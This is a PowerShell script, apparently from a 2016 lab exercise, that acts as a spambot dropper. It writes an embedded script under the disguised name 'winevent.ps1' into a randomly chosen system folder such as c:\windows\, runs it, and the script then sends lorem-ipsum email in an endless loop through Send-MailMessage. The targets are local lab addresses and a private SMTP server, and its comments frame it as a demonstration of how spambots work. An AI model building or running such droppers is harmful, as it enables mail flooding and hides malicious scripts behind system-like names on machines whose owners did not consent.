# Spambot with Powershell
# Author: Kelsey Ward
# Version: Prerelease
# Date: 11/18/2016

# list of directories where to install the spambot
$sbDir = @('c:\programdata\','c:\windows\','c:\Users\Default\AppData\', 'NODIR')

# Random number selected for the array index.
# Get the array count +1 so you don't have to
# keep changing the number of elements in the array
# this does it automatically.
$sbRand = Get-Random ($sbDir.Count + 1)

# If no directory is selected, exit the program
if ($sbDir[$sbRand] -eq 'NODIR') {

    exit

}

# Test that we can select from the array
#$sbDir[$sbRand]

# Check for the spambot in each directory and delete it if found.
foreach ($d in $sbDir) {

    # Check that the file exists
    if (Test-Path -Path $d\spambot.txt) {

        # Delete the file
        Remove-Item  $d\spambot.txt

    }

}

# Use a heredoc to write the spambot to the random location
$writeBot = @'
# Mesaage from this website: http://generator.lorem-ipsum.info/_latin
# Put the text into a variable.
$msg = "Lorem ipsum dolor sit amet, mel errem essent mandamus eu. Ius vitae accusam intellegat ea, in sea possim fabellas. Ut eam diceret eripuit, ea est denique omnesque iudicabit, ad vis prima tractatos facilisis. Pro idque integre an. In graeco signiferumque vis, denique torquatos nec at. Et iudico iuvaret voluptua eos, putant perfecto corrumpit et sea. Ne quando bonorum pri, pro impetus quaerendum eu.

Te has autem quidam, autem lorem maiorum ei mei, mea virtute feugait adversarium ex. In mea dicit copiosae. Nam possit mollis dissentias ne, sed summo aeterno no. Pro et augue perfecto, elit possit appellantur ut sit. Ei his augue liberavisse, mei an quando gloriatur pertinacia.

Reque consetetur ne est, ut cum dictas vulputate reprimique. Ius id pertinax suavitate, lucilius constituam ei mei. An everti melius mea. Ad quem nusquam expetendis vix, at cetero fuisset definitionem sit, eum primis delectus reprehendunt an. Sed probo justo ea, duo corpora mandamus at. Ea duo magna nulla, ad nostro interpretaris nec.

Ad unum postulant disputando sed, nec dicam quando ea, vix et agam inimicus. No sea verterem perfecto, ex sed natum fabulas. Ad has ignota prodesset deterruisset, cum id dicat similique appellantur. Iisque officiis in ius. Amet verterem pro ex, legere nominati explicari cu per. Cu mel etiam assum affert, vis liber euismod complectitur ex.

Eu eam nobis dolores offendit, tractatos interesset ex has. Mei ne aperiri pertinax. No aperiri alterum eos. Eos ex nihil epicuri ullamcorper, ius expetendis scriptorem ex. Esse solet sit at, dicunt atomorum no nec.

Te cum everti lucilius, dolor adolescens no sed. Cum ut delectus recusabo indoctum. Volumus corpora probatus nam ad. An fugit blandit sit, postea latine mel ne.

Ius alia quot veri at. Vocent indoctum nam ut, et has velit animal latine. Commune eligendi moderatius te duo, ius ex postea copiosae delicata. Ancillae erroribus elaboraret cu ius.

Vix mazim audire expetendis id, eius dicta corrumpit nec at. Mutat vitae sensibus et has, an nam summo falli probatus. No fuisset iudicabit vituperatoribus nam, tota mollis usu ex. Ea molestie voluptatibus pro. Per dicit scripta voluptatibus ut, sea ut graeco iuvaret inimicus.

Vitae accusata te sea, pri illud nostrud eu, case erat aperiam ius eu. Mei vero putent tractatos id, id has agam vero dissentiunt. Veritus adolescens sed ad, labitur eruditi antiopam no sit. Delenit nominavi oporteat eum ea, affert impetus expetendis cu quo.

Nam an omnium maluisset. Vidisse disputationi in quo, in natum eirmod vim, et amet admodum aliquando nec. Usu id vide numquam. Enim eripuit eam ut, cum aperiri mediocrem ut. His ei alia aperiri, at pri eius mandamus, pri autem consequuntur te. Vel cibo legere deleniti ne, duo eu eros albucius, ne iusto eripuit facilisi ius."

# Array of email addresses
$sbEmail = @('user1@server.local','user2@server.local', 'user3@server.local')

# Loop through the email messages with a while loop
# We use logic that will always be true)

# This is an infinite loop so you'll have to kill this process manually
# when you run it.
# This is the heart of it.
while (1 -lt 2) {

    # You'll see how fast this runs, so imagine sending an email to mail
    # servers and you'll quickly see how effective spambots are at infecting
    # the internet.
    foreach ($email in $sbEmail) {

        # Testing output, but put in the SMTP-MailMessage here.
        # You'll need to install Postfix on your Ubuntu server
        # Set it up for an "Internet" site during the install.
        echo "$email $msg"

        Send-MailMessage -From yoda@starwars.com -To $email -Subject "Tisk Tisk" -Body $msg -SmtpServer 192.168.169.135

        # If you want to slow things down, just put a sleep statement here
        sleep 1

    }


}

'@

# Print for testing
$sbDir[$sbRand]

# Creating the file and location to save the script
# using the random directory
$file = $sbDir[$sbRand] + "\winevent.ps1"

# Write the $writeBor variable to the file
$writeBot | out-file $file

# Executes the PowerShell script
Invoke-Expression $file 
